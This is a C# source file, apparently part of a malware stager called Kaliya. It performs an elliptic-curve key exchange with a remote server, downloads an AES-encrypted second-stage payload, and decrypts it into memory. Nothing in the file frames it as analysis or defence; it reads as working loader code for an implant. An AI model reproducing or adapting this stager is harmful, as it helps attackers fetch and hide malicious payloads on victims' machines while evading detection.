using System;
using System.IO;
using System.Numerics;
using System.Text;
using Kaliya.Crypto;
using Kaliya.Utils;
using Kaliya.Utils.PointInCurve;
using Waher.Security;
using Waher.Security.EllipticCurves;

namespace Kaliya
{
    internal static class Core
    {
        public static MemoryStream DownloadStage(Uri url, int sleep = 1, int retries = 10)
        {
            return Retry.Do(() =>
            {
                var key = GetSharedKey(url);
                var stage = Aes.Decrypt(key, Http.Get(url));
                return new MemoryStream(stage);
            }, TimeSpan.FromSeconds(sleep), retries);
        }

        private static byte[] GetSharedKey(Uri uri)
        {
            var curve = new NistP521();

            var json = Actions.WriteJson(new Coordinates
                {X = curve.PublicKey.X.ToString(), Y = curve.PublicKey.Y.ToString()});

            var response = Encoding.UTF8.GetString(Http.Post(uri, Encoding.UTF8.GetBytes(json)));

            var serverCoords = Actions.ParseJson((response));

            return curve.GetSharedKey(
                new PointOnCurve(BigInteger.Parse(serverCoords.X), BigInteger.Parse(serverCoords.Y)),
                HashFunction.SHA256);
        }
    }
}